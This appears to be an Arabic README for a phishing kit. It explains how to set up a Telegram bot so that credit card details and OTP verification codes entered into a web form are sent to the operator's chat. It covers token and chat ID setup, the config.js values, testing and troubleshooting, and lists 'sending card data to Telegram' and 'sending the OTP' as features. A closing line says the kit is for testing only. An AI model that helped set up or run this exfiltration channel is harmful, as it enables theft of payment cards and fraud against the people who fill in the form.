# دليل إعداد بوت تلجرام 🤖

هذا الدليل يشرح كيفية إعداد بوت تلجرام لاستقبال بيانات البطاقات من النموذج.

## الخطوة 1: إنشاء بوت جديد على تلجرام

1. افتح تطبيق تلجرام أو زر [t.me/botfather](https://t.me/botfather)
2. ابدأ محادثة مع **BotFather** (البوت الرسمي لإنشاء البوتات)
3. أرسل الأمر `/start` ثم اتبع التعليمات
4. أرسل `/newbot` لإنشاء بوت جديد
5. اتبع الخطوات:
   - أدخل اسم البوت (مثل: "Credit Card Bot")
   - أدخل اسم المستخدم للبوت (يجب أن ينتهي بـ "bot")
6. **احفظ التوكن الذي سيعطيك إياه** (يبدو مثل: `123456789:ABCDefGHIjklmnoPQRstuvWXYZ`)

## الخطوة 2: الحصول على معرف الدردشة (Chat ID)

### الطريقة 1: استخدام بوت معلومات المستخدم
1. افتح تطبيق تلجرام
2. ابحث عن البوت **@userinfobot**
3. ابدأ محادثة معه
4. سيعطيك معرف الدردشة الخاص بك (يبدو مثل: `123456789`)

### الطريقة 2: استخدام رابط مباشر
1. افتح الرابط التالي في متصفحك:
   ```
   https://api.telegram.org/bot[YOUR_BOT_TOKEN]/getUpdates
   ```
   استبدل `[YOUR_BOT_TOKEN]` بالتوكن الذي حصلت عليه
2. ابحث عن `"chat":{"id":` في النتيجة
3. الرقم بعده هو معرف الدردشة الخاص بك

## الخطوة 3: تحديث ملف الإعدادات

1. افتح ملف `config.js` في المشروع
2. استبدل القيم التالية:

```javascript
const TELEGRAM_CONFIG = {
  BOT_TOKEN: "YOUR_BOT_TOKEN_HERE",  // ← ضع التوكن هنا
  CHAT_ID: "YOUR_CHAT_ID_HERE",      // ← ضع معرف الدردشة هنا
  API_URL: "https://api.telegram.org/bot"
};
```

**مثال:**
```javascript
const TELEGRAM_CONFIG = {
  BOT_TOKEN: "123456789:ABCDefGHIjklmnoPQRstuvWXYZ",
  CHAT_ID: "987654321",
  API_URL: "https://api.telegram.org/bot"
};
```

## الخطوة 4: اختبار الإعدادات

1. افتح الصفحة الرئيسية للمشروع
2. ملء نموذج البطاقة بالبيانات
3. انقر على زر "إرسال"
4. يجب أن تستقبل رسالة على تلجرام بالبيانات

## استكشاف الأخطاء

### الخطأ: "إعدادات تلجرام غير صحيحة"
- تأكد من أنك قمت بتحديث ملف `config.js`
- تحقق من أن التوكن ومعرف الدردشة صحيحان

### الخطأ: "HTTP error! status: 401"
- التوكن غير صحيح أو منتهي الصلاحية
- جرب إنشاء بوت جديد من BotFather

### الخطأ: "Telegram error: Bad Request: chat not found"
- معرف الدردشة غير صحيح
- استخدم @userinfobot للحصول على المعرف الصحيح

### لا تستقبل الرسائل
- تأكد من أنك بدأت محادثة مع البوت الخاص بك
- جرب إرسال رسالة للبوت يدويًا أولاً

## معلومات إضافية

### ملفات مهمة:
- `config.js` - ملف الإعدادات (يحتوي على التوكن ومعرف الدردشة)
- `script.js` - منطق الصفحة الرئيسية
- `otp-script.js` - منطق صفحة التحقق

### الميزات المتاحة:
✅ إرسال بيانات البطاقة إلى تلجرام
✅ إرسال رمز التحقق (OTP) إلى تلجرام
✅ التحقق من صحة البيانات قبل الإرسال
✅ منع الإرسال المتكرر
✅ معالجة الأخطاء الشاملة
✅ حفظ البيانات محليًا (localStorage)

## أمان البيانات ⚠️

**تحذير مهم:** هذا المشروع مخصص للاختبار والتطوير فقط.
- لا تستخدمه لجمع بيانات بطاقات ائتمان حقيقية
- لا تشارك ملف `config.js` مع أحد
- استخدم HTTPS دائمًا في الإنتاج

## الدعم

إذا واجهت مشكلة، تحقق من:
1. سجل المتصفح (F12 → Console)
2. رسائل الخطأ المعروضة
3. تأكد من أن الاتصال بالإنترنت يعمل
